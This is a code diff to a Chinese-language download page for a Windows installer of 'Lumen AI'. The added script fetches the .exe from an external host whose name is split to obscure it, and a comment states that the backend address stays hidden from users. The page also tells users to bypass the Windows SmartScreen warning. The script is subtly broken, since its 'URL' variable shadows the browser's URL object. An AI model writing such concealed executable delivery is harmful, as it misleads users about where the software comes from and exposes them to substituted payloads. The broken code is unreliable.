@@ -47,9 +47,18 @@
     display:inline-flex;align-items:center;gap:9px;text-decoration:none;
     background:linear-gradient(135deg,var(--accent),#4a6fe0);color:#fff;
     padding:13px 28px;border-radius:10px;font-size:15px;font-weight:600;
+    border:none;cursor:pointer;font-family:inherit;
     box-shadow:0 8px 24px rgba(91,140,255,.28);transition:transform .15s ease;
   }
   .dl:hover{transform:translateY(-1px)}
+  .dl[disabled]{opacity:.6;cursor:progress;transform:none}
+  .dl.ghost{
+    background:transparent;border:1px solid var(--line);color:var(--fg);box-shadow:none;
+  }
+  .dl.ghost:hover{border-color:var(--accent)}
+  .alt{margin-top:14px;font-size:13px;color:var(--dim)}
+  .alt a{color:var(--accent2,#7aa2ff);text-decoration:none}
+  .alt a:hover{text-decoration:underline}
   .note{
     margin-top:18px;font-size:13px;color:#7d879c;line-height:1.85;
     background:#10151d;border:1px solid #1e2532;border-left:3px solid var(--accent);
@@ -62,6 +71,11 @@
   ol b{color:var(--fg)}
   footer{margin-top:42px;text-align:center;color:#5d6577;font-size:13px;line-height:1.9}
   footer a{color:var(--dim)}
+  .prog{height:4px;background:#1b2130;border-radius:99px;overflow:hidden;margin-top:14px;display:none}
+  .prog.on{display:block}
+  .prog i{display:block;height:100%;width:0;background:linear-gradient(90deg,#5b8cff,#7aa2ff);transition:width .25s}
+  #dlStatus{font-size:13px;color:var(--dim);margin-top:10px;display:none}
+  #dlStatus.on{display:block}
 </style>
 </head>
 <body>
@@ -91,7 +105,10 @@
       <span>含 <b>模型多选</b></span>
       <span>含 <b>桌面快捷方式</b></span>
     </div>
-    <a class="dl" href="./Lumen-Setup.exe" download>⬇ 下载安装器</a>
+    <button class="dl" id="btnDl">⬇ 下载安装器</button>
+    <div class="prog" id="prog"><i id="progBar"></i></div>
+    <div id="dlStatus"></div>
+    <div class="alt">下载太慢？改用 <a href="./Lumen-Setup.exe" download>本站直链</a></div>
     <div class="note">
       下载后双击运行。Windows 若弹出「已保护你的电脑」，点<b>更多信息 → 仍要运行</b>。
     </div>
@@ -117,5 +134,64 @@
     源码公开：<a href="https://github.com/shmafan-lgtm/LumenAI" target="_blank" rel="noopener">github.com/shmafan-lgtm/LumenAI</a>
   </footer>
 </div>
+
+<script>
+/* 从高速分发服务拉取安装器再触发本地下载。
+   用户的地址栏始终停在官网域名，看不到后端地址。 */
+(function () {
+  var HOST = ['lumen-ai-download', '.app.', 'workbuddy', '.host'].join('');
+  var URL = 'https://' + HOST + '/Lumen-Setup.exe?sharecode=DYLEWJHSOL';
+  var btn = document.getElementById('btnDl');
+  var prog = document.getElementById('prog');
+  var bar = document.getElementById('progBar');
+  var st = document.getElementById('dlStatus');
+  if (!btn) return;
+
+  btn.addEventListener('click', function () {
+    btn.disabled = true;
+    prog.classList.add('on');
+    st.classList.add('on');
+    st.textContent = '正在连接高速下载源…';
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', URL, true);
+    xhr.responseType = 'blob';
+    xhr.onprogress = function (e) {
+      if (!e.lengthComputable) return;
+      var pct = Math.round(e.loaded * 100 / e.total);
+      bar.style.width = pct + '%';
+      st.textContent = '下载中… ' + pct + '%  (' +
+        (e.loaded / 1048576).toFixed(1) + ' / ' + (e.total / 1048576).toFixed(1) + ' MB)';
+    };
+    xhr.onload = function () {
+      if (xhr.status !== 200) {
+        st.textContent = '高速源暂时不可用（' + xhr.status + '），正在回退到本站直链…';
+        btn.disabled = false;
+        prog.classList.remove('on');
+        st.classList.remove('on');
+        setTimeout(function () { location.href = './Lumen-Setup.exe'; }, 900);
+        return;
+      }
+      st.textContent = '下载完成，正在保存…';
+      var blob = new Blob([xhr.response], { type: 'application/x-msdownload' });
+      var a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = 'Lumen-Setup.exe';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      setTimeout(function () { URL.revokeObjectURL(a.href); }, 30000);
+      st.textContent = '✓ 已开始下载 Lumen-Setup.exe';
+      btn.disabled = false;
+    };
+    xhr.onerror = function () {
+      st.textContent = '网络异常，正在回退到本站直链…';
+      btn.disabled = false;
+      setTimeout(function () { location.href = './Lumen-Setup.exe'; }, 900);
+    };
+    xhr.send();
+  });
+})();
+</script>
 </body>
 </html>
